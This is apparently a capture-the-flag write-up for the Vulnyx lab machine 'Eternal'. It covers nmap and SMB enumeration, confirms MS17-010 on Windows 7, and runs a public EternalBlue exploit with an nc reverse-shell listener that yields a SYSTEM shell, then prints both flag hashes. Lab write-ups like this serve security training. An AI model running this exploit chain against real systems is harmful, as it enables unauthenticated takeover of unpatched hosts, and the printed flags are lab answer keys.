# Vulnyx: Eternal

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Windows |
| **Difficulty** | Low |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `nxc` · `Win7Blue` · `nc` |
| **Tags** | `#EternalBlue` `#MS17-010` `#UnauthenticatedRCE` `#LegacyWindows` |
| **URL** | https://vulnyx.com/machines/ |

The open port spread — SMB with no modern services like WinRM alongside it — points toward a legacy Windows install, and `nmap`'s vulnerability scripts confirm it's exposed to MS17-010, better known as EternalBlue. Exploiting it gives a SYSTEM shell directly, with no separate privilege escalation step needed — both flags sit in the same user's Desktop folder.

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```bash
sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn eternal.nyx

PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5357/tcp  open  wsdapi       syn-ack ttl 128
49152/tcp open  unknown      syn-ack ttl 128
49153/tcp open  unknown      syn-ack ttl 128
49154/tcp open  unknown      syn-ack ttl 128
49155/tcp open  unknown      syn-ack ttl 128
49156/tcp open  unknown      syn-ack ttl 128
49157/tcp open  unknown      syn-ack ttl 128
MAC Address: 08:00:27:66:35:1F (Oracle VirtualBox virtual NIC)
```

A version/script scan against the open ports fills in the details:

```bash
sudo nmap -p 135,139,445,5357,49152,49153,49154,49155,49156,49157 -sCV eternal.nyx

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:66:35:1F (Oracle VirtualBox virtual NIC)
Service Info: Host: MIKE-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-31T15:25:51
|_  start_date: 2026-05-31T15:22:56
|_clock-skew: mean: 19m59s, deviation: 1h09m16s, median: 59m58s
| smb-os-discovery: 
|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: MIKE-PC
|   NetBIOS computer name: MIKE-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-31T17:25:51+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: MIKE-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:66:35:1f (Oracle VirtualBox virtual NIC)
```

The port list is a giveaway on its own — SMB (445) alongside old-style RPC ports and no WinRM (5985) or the usual modern web/management ports suggests an older, unpatched Windows build.

### SMB Enumeration

```bash
nxc smb eternal.nyx
SMB         10.0.2.19       445    MIKE-PC          [*] Windows 7 Enterprise 7601 Service Pack 1 x64 (name:MIKE-PC) (domain:MIKE-PC) (signing:False) (SMBv1:True) (Null Auth:True)
```
```bash
nxc smb eternal.nyx -u '' -p '' --shares
SMB         10.0.2.19       445    MIKE-PC          [*] Windows 7 Enterprise 7601 Service Pack 1 x64 (name:MIKE-PC) (domain:MIKE-PC) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         10.0.2.19       445    MIKE-PC          [+] MIKE-PC\: 
SMB         10.0.2.19       445    MIKE-PC          [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

### Confirming MS17-010

`nmap`'s SMB vulnerability scripts check directly for known SMB flaws, EternalBlue included:

```bash
sudo nmap -p 445 --script="smb-vuln*" eternal.nyx

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:66:35:1F (Oracle VirtualBox virtual NIC)

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|       servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
```

The target is vulnerable. A ready-made exploit is used rather than building one from scratch:

> **Exploit:** `https://github.com/d4t4s3c/Win7Blue`

## Initial Access

### EternalBlue Exploitation

MS17-010 is a remote, unauthenticated SMBv1 kernel exploit — successful exploitation runs code directly in kernel context, which is why it lands as SYSTEM immediately rather than as a lower-privileged user first:

```bash
git clone https://github.com/d4t4s3c/Win7Blue.git
cd Win7Blue
chmod +x Win7Blue
./Win7Blue
```

<img src="../Images/eternal/Pasted image 20260531165419.png"/>

A listener catches the callback:

```bash
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.19] 49158
Microsoft Windows [Versi•n 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Windows\system32>
```

```cmd
C:\Windows\System32>whoami
nt authority\system
C:\Windows\System32>dir C:\Users\MIKE\Desktop
 El volumen de la unidad C no tiene etiqueta.
 El n•mero de serie del volumen es: 44FD-46F4

 Directorio de C:\Users\MIKE\Desktop

03/02/2024  13:50    <DIR>          .
03/02/2024  13:50    <DIR>          ..
03/02/2024  13:50                35 root.txt
03/02/2024  13:50                35 user.txt
               2 archivos             70 bytes
               2 dirs  24.469.618.688 bytes libres

C:\Windows\System32>type C:\Users\MIKE\Desktop\user.txt
c4fa8bfbc9855acfced6a56a7da3156e

C:\Windows\System32>type C:\Users\MIKE\Desktop\root.txt
1682c7160e3855a6685316efb97ce451
```

> **User flag:** `c4fa8bfbc9855acfced6a56a7da3156e`
> **Root flag:** `1682c7160e3855a6685316efb97ce451`

Both flags sit in the same location, since the exploit grants full SYSTEM-level access from the very first shell — there's no separate privilege escalation phase on this box.

## Takeaways

- A port list alone can be a strong signal — SMB without any of the newer Windows management services running alongside it is often enough to guess "old, unpatched" before running a single vulnerability script.
- MS17-010 is a kernel-level exploit, not an application-level one; that's the whole reason it skips straight to SYSTEM instead of landing as a service account that then needs escalating.
- A machine's exploitability doesn't require complexity — sometimes the entire chain is "confirm the CVE, run the known public exploit," and that's a legitimate (if less elaborate) writeup in its own right.